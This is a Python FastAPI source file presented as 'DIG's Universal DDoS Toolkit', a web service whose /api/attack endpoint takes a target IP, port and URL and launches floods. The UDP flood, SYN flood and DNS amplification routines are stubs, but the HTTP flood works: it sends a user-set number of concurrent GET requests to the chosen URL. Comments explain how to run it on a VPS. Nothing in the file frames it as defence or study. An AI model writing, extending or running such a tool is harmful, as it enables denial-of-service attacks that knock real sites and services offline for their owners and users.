from fastapi import FastAPI, Request, HTTPException, Query
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
import httpx
import asyncio
from typing import List, Optional

# --- 1. Pydantic Models for Input Validation ---
class AttackParameters(BaseModel):
    """Defines the structure of the data expected from the frontend."""
    attackType: str
    targetIp: str
    targetPort: int = 80 # Defaulting port if not specified by attack type
    url: str = "http://localhost/"
    threads: int = 50
    payloadSize: int = 50

# --- 2. FastAPI Initialization ---
app = FastAPI(title="DIG's Universal DDoS Toolkit")


# --- 3. CORE ATTACK MODULES (Async Versions) ---

class DDOSAttacker:
    """Aggregates various attack vectors using async I/O."""

    @staticmethod
    async def simple_udp_flood(target_ip, target_port, packet_size, count=1000):
        """UDP Flood simulation requires raw sockets, which is challenging for pure FastAPI. 
        We use asyncio's socket wrapper or fall back to placeholders."""
        print("--- Executing UDP Flood (Simulation) ---")
        # NOTE: True raw UDP flooding often needs external libraries like 'scapy', 
        # which are harder to manage in a serverless context than HTTP.
        await asyncio.sleep(1) # Simulate work time for async flow
        return f"UDP Flood simulated successfully. (Requires advanced raw socket implementation)."

    @staticmethod
    async def http_flood(target_url, headers_list, threads):
        """Async simulation of a high volume GET/POST request flood (Layer 7)."""
        print("--- Executing HTTP Flood ---")

        # Use httpx.AsyncClient for connection pooling and async requests
        async with httpx.AsyncClient(timeout=10) as client:
            tasks = []
            for _ in range(threads):
                # Simulate GET request using async call
                task = asyncio.create_task(client.get(target_url))
                tasks.append(task)

            # Run all tasks concurrently (the core of the flood simulation)
            results = await asyncio.gather(*tasks, return_exceptions=True)

            success_count = 0
            for result in results:
                if isinstance(result, httpx.Response):
                    if result.status_code < 400:
                        success_count += 1
                elif isinstance(result, Exception):
                    # Handle connection errors or timeouts gracefully
                    pass

            return (f"HTTP Flood executed. Attempted {len(results)} requests. "
                    f"Successfully connected/received responses from ~{success_count} threads.")


    @staticmethod
    async def syn_flood(target_ip, target_port, packet_size, count=1000):
        """SYN Flood simulation placeholder."""
        await asyncio.sleep(0.5)
        return f"SYN Flood simulated: Requires raw socket libraries (like Scapy) for full functionality."

    @staticmethod
    async def amplification_dns(target_ip, port, query_size=100):
        """DNS Amplification placeholder."""
        await asyncio.sleep(0.5)
        return "DNS Amplification simulated: Requires specialized DNS libraries for execution."


# --- 4. API ENDPOINTS (The Web Interface Logic) ---

@app.get("/", response_class=HTMLResponse)
async def get_homepage():
    """Renders the HTML interface."""
    # In a real Vercel deployment, you'd use Jinja2 templates here:
    # return render_template('index.html')
    return "<h1>DDoS Toolkit Interface Loaded</h1><p>Use frontend JavaScript to interact with the /api/attack endpoint.</p>"


@app.post("/api/attack")
async def handle_attack(params: AttackParameters):
    """Receives attack parameters and runs the appropriate async module."""

    # Re-fetch dynamic data if needed, or rely on params object
    target_ip = params.targetIp
    target_port = params.targetPort
    target_url = params.url
    threads = params.threads
    payload_size = params.payloadSize

    attack_type = params.attackType
    results = []

    if not target_ip:
        raise HTTPException(status_code=400, detail="Target IP is required.")


    # --- Attack Dispatcher (Async Calls) ---
    try:
        if attack_type == 'udp_flood':
            result = await DDOSAttacker.simple_udp_flood(target_ip, target_port, payload_size)
            results.append({"attack": "UDP Flood", "status": result})

        elif attack_type == 'http_flood':
            # Re-use the dummy headers list for simplicity in this example
            dummy_headers = [{'User-Agent': 'Mozilla/5.0 (AsyncClient)'}] 
            result = await DDOSAttacker.http_flood(target_url, dummy_headers, threads)
            results.append({"attack": "HTTP Flood (Layer 7)", "status": result})

        elif attack_type == 'syn_flood':
            result = await DDOSAttacker.syn_flood(target_ip, target_port, payload_size)
            results.append({"attack": "SYN Flood", "status": result})

        elif attack_type == 'amplification_dns':
            result = await DDOSAttacker.amplification_dns(target_ip, None)
            results.append({"attack": "DNS Amplification", "status": result})

        else:
            return JSONResponse({"error": f"Unknown or unsupported attack type: {attack_type}"}, status_code=400)

    except Exception as e:
        # Catching unexpected runtime errors during the execution phase
        raise HTTPException(status_code=500, detail=f"An internal error occurred during attack execution: {str(e)}")


    return JSONResponse({
        "success": True,
        "summary": "Attack execution initiated.",
        "details": results
    })

# --- 5. Running Instructions (For Local Test) ---
# To run this locally on your VPS terminal (after installing deps):
# uvicorn main:app --reload --host 0.0.0.0 --port 80
